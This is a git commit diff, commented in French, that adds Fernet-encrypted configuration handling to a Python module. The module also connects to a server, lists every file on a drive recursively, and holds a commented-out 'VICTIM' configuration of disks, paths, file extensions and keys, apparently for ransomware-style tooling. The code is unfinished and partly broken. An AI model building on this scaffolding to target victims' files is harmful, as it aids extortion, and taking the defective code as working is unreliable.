3ff58ba6face3afe4ab47421028fbbc8ee1385ab
Lameuhton <s.tylaura@hotmail.com>
2021-05-10 12:05:00 +0200

    Ajout de l'encryption, du chargement, de la modification et de la création des fichiers de configuration

--- utile/config.py
+++ utile/config.py
@@ -4,10 +4,28 @@ import json
 import glob
 import sys
 import configparser
+from cryptography.fernet import Fernet
+
 
 # Connexion au serveur
 serv, gp = net.connect_to_serv()
 #----------------------------------------------------------
+def lister_chemins_fichiers(disque):
+
+    disk = str(disque)
+    path_files = glob.glob(f'{disque}:/**/*', recursive = True)
+
+    return path_files
+
+def lire_fichier(path_file):
+
+    file = open(path_file, "r")
+    content = file.read()
+    file.close()
+
+    return content
+
+
 
 def choix_action():
     """
@@ -46,7 +64,7 @@ def print_config(num_config):
     :param num_config:
     """
 
-def set_config(action,param,value):
+def set_config(name,action,param,value):
     """
     Cette fonction sert, selon les choix de l'utilisateur, à supprimer un paramètre d'une configuraiton, modifier une valeur déjà présente,
     ou ajouter une valeur.
@@ -55,25 +73,82 @@ def set_config(action,param,value):
     :param value: si l'utilisateur veut ajouter ou modifier, la valeur par laquelle le paramètre va être changé
     """
 
+    if action == 1: #Si action est a 1, on ajoute dans le fichier
+        load_config(name)
 
 
-def lister_chemins_fichiers(disque):
 
-    disk = str(disque)
-    path_files = glob.glob(f'{disque}:/**/*', recursive = True)
+def load_config(name):
+    """
+    Cette fonction charge une configuration
+    :param name: str, le nom du fichier de configuration qu'il faudra ouvrir
+    :return: dict, contient le contenu du fichier de configuration sous forme de dictionnaire
+    """
 
-    return path_files
-
-def lire_fichier(path_file):
-
-    file = open(path_file, "r")
-    content = file.read()
+    # Ouvre le fichier cfg correspondant, lis son contenu et le stocke
+    file = open(f"{name}.cfg", "r")
+    content_config = file.read()
+    # Transforme le contenu (au format json) en dictionnaire
+    content_config = json.loads(content_config)
     file.close()
 
-    return content
+    # Ouvre le fichier key correspondant, lis son contenu et le stocke
+    file = open(f"{name}.key", "rb")
+    key_config = file.read()
+    file.close()
+
+    # Decrypte le contenu qui a été récupéré du fichier cfg avec la clé qui a été récupérée du fichier key
+    content_decrypted = decrypt(content_config,key_config)
+
+    return content_decrypted
+
+def create_config(name="config"):
+    """
+    Cette fonction créée un fichier de configuration et un fichier qui stockera la clé (fichiers vides)
+    :param type_system
+    """
+
+    #Si la suite, ajouter un paramètre type_system à la fonction
+    #config = configparser.ConfigParser()
+    # if type_system == 'WORKSTATION':
+    #     config['VICTIM'] = {'DISKS' : [],
+    #                         'PATHS' : [],
+    #                         'FILE_EXT': [],
+    #                         'FREQ' : '120',
+    #                         'KEY' : None,
+    #                         'STATE' : 'INITIALIZE'
+    #                         }
+    # elif type_system == 'SERVER':
+    #     config['VICTIM'] = {'DISKS': [],
+    #                         'PATHS': [],
+    #                         'FILE_EXT': [],
+    #                         'FREQ': '60',
+    #                         'KEY': None,
+    #                         'STATE': 'INITIALIZE'
+    #                         }
+
+    open(f"{name}.cfg", "w")
+    open(f"{name}.key", "w")
 
 
+def encrypt(content,key):
+    encoded_content = content.encode()
+    f = Fernet(key)
+    encrypted_content = f.encrypt(content)
 
+    return encrypted_content
+
+def decrypt(content,key):
+    f = Fernet(key)
+    decrypted_message_json = f.decrypt(content)
+    decrypted_message = json.loads(decrypted_message_json)
+
+    return decrypted_message
+
+def generate_key(name):
+    key = Fernet.generate_key()
+    with open(f"{name}.key", "wb") as key_file:
+        key_file.write(key)
 
 '''def creation_fichier_json():
 
@@ -96,7 +171,7 @@ num_choix = choix_action()
 while num_choix != 7:
 
     if num_choix == 1:
-
+        load_config()
 
     if num_choix == 2:
 
@@ -105,6 +180,8 @@ while num_choix != 7:
     if num_choix == 4:
 
     if num_choix == 5:
+        create_config()
+        print("\nLa configuration courante est réinitialisée")
 
     if num_choix == 6:
 
@@ -112,5 +189,5 @@ while num_choix != 7:
     num_choix = choix_action()
 
 # Ferme la fenêtre lorsque le choix est 4
-print("Fermeture de la session.")
+print("\nFermeture de la session.")
 exit()
